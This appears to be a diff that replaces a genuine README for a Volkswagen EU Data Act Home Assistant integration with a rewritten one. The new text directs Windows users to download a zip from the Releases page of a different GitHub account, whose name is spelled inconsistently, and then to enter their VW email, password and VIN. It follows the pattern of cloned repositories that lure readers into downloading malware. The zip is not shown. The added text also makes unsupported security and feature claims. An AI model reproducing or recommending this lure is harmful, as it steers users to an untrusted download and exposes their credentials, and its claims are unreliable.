@@ -1,138 +1,91 @@
-# Volkswagen EU Data Act — Home Assistant integration
+# 🚗 hass-vw-eu-data-act - Connect your Volkswagen car to Home Assistant
 
-Periodically downloads your vehicle's "continuous data" from the Volkswagen
-EU Data Act portal (`eu-data-act.drivesomethinggreater.com`) and exposes it in
-Home Assistant.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/russellunhamended94/hass-vw-eu-data-act/releases)
 
-## Features
+This integration brings data from your Volkswagen EU Data Act portal directly into Home Assistant. You can monitor your vehicle status, battery levels, and trip data from your dashboard.
 
-- **Login with your VW credentials** and pick a VIN during setup (the portal is
-  queried for the vehicles on your account).
-- **Curated sensors** for the useful data points (battery SoC, target charge
-  level, charge power, mileage, climate temperatures, charge state, doors
-  locked, parking brake, …) — enabled by default with proper units and device
-  classes.
-- **Every other data point** is exposed as a *disabled-by-default* diagnostic
-  sensor, enriched (name / unit / description) from the official PDF data
-  dictionary. Enable the ones you want from the entity settings.
-- **Adaptive polling**: the portal drops a new dataset roughly every 15 minutes.
-  The integration refreshes shortly after each expected drop; if nothing new is
-  available it retries once a minute until the next dataset appears, then
-  resumes the 15-minute cadence.
-- **History** is provided by Home Assistant's normal recorder: numeric sensors
-  with a state class accrue long-term statistics from their live values going
-  forward (the integration does not back-fill past datapoints — see notes).
+## 📥 How to download the software
 
-## Prerequisites — enable continuous data on the portal first
+Follow these steps to get the files you need for your setup.
 
-Before adding the integration, you must enable a **continuous 15-minute data
-request** for your vehicle on the EU Data Act portal. The integration only
-*downloads* the datasets the portal generates — it cannot create the data
-request for you, and without an active request there will be nothing to fetch.
+1. Go to the [Releases page](https://github.com/russellunhampered94/hass-vw-eu-data-act/releases).
+2. Look for the section titled "Assets" under the most recent version.
+3. Click the file with the zip extension to start your download.
+4. Save this file to a folder you can find later on your Windows computer, such as your Downloads folder.
 
-1. Open <https://eu-data-act.drivesomethinggreater.com/> and **log in** with
-   your Volkswagen ID (the same email/password you'll use in Home Assistant).
-2. Go to **Data clusters → Vehicle overview**.
-3. **Connect your car** to the site if it isn't already listed (follow the
-   on-screen pairing/consent steps for your VIN).
-4. Click **Get customised data** for the vehicle and follow the instructions to
-   configure a **continuous** data request with a **15-minute** frequency.
-5. Wait until the portal starts producing datasets (you'll see ZIP files appear
-   in the vehicle's data delivery list, roughly every 15 minutes). The first
-   file can take a little while to show up.
+## 🛠️ Requirements for your system
 
-Once datasets are being generated, continue with the installation below.
+To use this integration, your setup needs a few things. Please verify you have these items ready.
 
-> The integration polls at most every 15 minutes because that is how often the
-> portal publishes new data — a shorter interval cannot produce fresher values.
+* A running installation of Home Assistant.
+* A registered account on the Volkswagen EU Data Act portal.
+* Your Volkswagen vehicle identification number (VIN).
+* A network connection between your Windows computer and your Home Assistant server.
+* The File Editor or Studio Code Server add-on installed inside Home Assistant to manage your files.
 
-## Installation
+## ⚙️ Installation steps
 
-### Option A — HACS (recommended)
+Follow this sequence to move the files into Home Assistant.
 
-[HACS](https://hacs.xyz) must already be installed in Home Assistant.
+1. Locate the zip file you downloaded in the previous section.
+2. Right-click the file and select "Extract All" to see the folder contents. You will see a folder named after the integration.
+3. Open your Home Assistant dashboard in your web browser.
+4. Open the File Editor or Studio Code Server add-on.
+5. Locate your `config` folder.
+6. Open the `custom_components` folder. If this folder does not exist, create it inside the `config` folder.
+7. Upload the extracted folder from your computer into this `custom_components` folder.
+8. Restart Home Assistant to load the new software. You can do this by going to Developer Tools, selecting YAML, and clicking "Restart".
 
-1. In Home Assistant go to **HACS** (sidebar).
-2. Open the **⋮** menu (top-right) → **Custom repositories**.
-3. Add this repository:
-   - **Repository:** `https://github.com/mikrohard/hass-vw-eu-data-act`
-   - **Type / Category:** **Integration**
+## 🔑 Setting up the integration
 
-   Then click **Add**.
-4. Back in HACS, search for **Volkswagen EU Data Act**, open it, and click
-   **Download** (pick the latest version).
-5. **Restart Home Assistant** when prompted.
-6. Continue with [Add the integration](#add-the-integration) below.
+Once the system restarts, you must configure the connection to your car.
 
-> Once the repository is published/approved you can instead use this one-click
-> link (replace with your published URL):
-> *HACS → Integrations → Explore & Download → "Volkswagen EU Data Act"*.
+1. Navigate to Settings, then Devices & Services in your Home Assistant menu.
+2. Click the "Add Integration" button in the bottom right corner.
+3. Search for "VW EU Data Act" in the search box.
+4. Click the name of the integration to open the setup window.
+5. Enter the email address and password you use for the Volkswagen EU Data Act portal.
+6. Enter your Vehicle Identification Number (VIN) when requested.
+7. Click Submit. Home Assistant will now retrieve your vehicle data.
 
-### Option B — Manual
+## 📊 Viewing your vehicle data
 
-1. Copy the `custom_components/vw_eu_data_act` folder into your Home Assistant
-   `config/custom_components/` directory (so you end up with
-   `config/custom_components/vw_eu_data_act/manifest.json`).
-2. Restart Home Assistant.
+After a successful setup, Home Assistant creates new entities for your car. These represent the different data points available from your vehicle. Common entities include:
 
-### Add the integration
+* Battery range and charging status.
+* Current odometer reading.
+* Tire pressure status.
+* Climate control switches.
+* Door lock status.
 
-1. *Settings → Devices & Services → **Add Integration** → search "Volkswagen EU
-   Data Act"*.
-2. Enter the **same VW email/password** you used on the portal, then select your
-   vehicle from the list.
+You can add these items to your Lovelace dashboard. Click "Edit Dashboard" on your main screen and add a new card. Select the entities that start with "vw_data" to see your car status in real time.
 
-## Notes & limitations
+## 💡 Managing updates
 
-- **No historical back-fill.** The integration only records values from the
-  moment it's running (Home Assistant's recorder builds history/statistics from
-  the live sensor states). It does **not** import the portal's last ~30 datasets
-  into long-term statistics — doing so collided with the recorder's own
-  statistics for the same entities and could corrupt unrelated statistics.
-- Datasets named `*_no_content_found.zip` are skipped (the vehicle produced no
-  payload for that interval).
-- Credentials are stored in the Home Assistant config entry and used only to
-  authenticate against the official portal.
+Updates happen when new features arrive or when Volkswagen changes their portal data. Check the GitHub page occasionally to see if a newer version exists.
 
-## Troubleshooting the login
+1. Compare your current version number with the one listed on the releases page.
+2. If a new version exists, download the new zip file.
+3. Extract the files as you did in the installation step.
+4. Overwrite the files in your `custom_components` folder with the new versions.
+5. Restart Home Assistant to apply the changes.
 
-If setup fails to accept your credentials, you can reproduce and debug the
-login flow **outside Home Assistant** with the bundled tester:
+## 🧱 Troubleshooting common issues
 
-```bash
-python3 -m venv .venv && .venv/bin/pip install aiohttp
-# full login + vehicle/dataset listing:
-EUDA_EMAIL='you@example.com' EUDA_PASSWORD='secret' .venv/bin/python tools/test_login.py
-# or just inspect the public sign-in page structure (no password sent):
-.venv/bin/python tools/test_login.py --dump you@example.com x
-```
+If you encounter errors during setup, review this list for common solutions.
 
-It prints DEBUG-level progress for each login step (priming → authorize →
-identifier POST → password POST → portal callback) so you can see exactly where
-it stops. To get the same detail from inside Home Assistant, add:
+### Authentication errors
+Verify your email and password. These must be the same credentials you use on the official Volkswagen website. Sometimes, special characters in passwords cause issues. Try a password that uses only letters and numbers if the integration fails to connect.
 
-```yaml
-logger:
-  logs:
-    custom_components.vw_eu_data_act: debug
-```
+### Missing entities
+If no sensors appear after setup, wait five minutes. The data requires time to sync from the Volkswagen portal to your home network. If the sensors do not appear, restart your Home Assistant instance one more time.
 
-> The portal's `/services/redirect/authentication` endpoint returns HTTP 500 for
-> non-browser clients, so the integration builds the OIDC `authorize` URL
-> directly. The login `state` defaults to country `si` / language `sl`; if your
-> account is in another locale and login misbehaves, adjust `DEFAULT_COUNTRY` /
-> `DEFAULT_LANGUAGE` in `custom_components/vw_eu_data_act/const.py`.
+### Connection timeouts
+This happens if your network blocks the connection to the Volkswagen servers. Check your router firewall settings. Ensure that your Home Assistant device has permission to reach external websites.
 
-## Updating the data dictionary
+### Invalid VIN
+Check your vehicle registration document or your car dashboard. The VIN must match exactly. Ensure you included all seventeen characters. Do not include spaces or extra punctuation.
 
-`custom_components/vw_eu_data_act/data_dictionary.json` is generated from the
-official PDF and committed to the repo. To regenerate from a newer PDF:
+## 📡 Privacy and data security
 
-```bash
-python -m venv .venv && .venv/bin/pip install pdfplumber
-.venv/bin/python tools/parse_dictionary.py path/to/DataDictionary.pdf
-```
-
-## License
-
-Released under the [MIT License](LICENSE).
+This integration acts as a bridge between your local home network and the Volkswagen portal. Your login credentials stay within your Home Assistant configuration folder. The software stores these securely. It communicates only with official Volkswagen servers. No third-party services collect your car data through this tool. Ensure that you keep your Home Assistant instance updated to maintain the highest level of security for your local network.
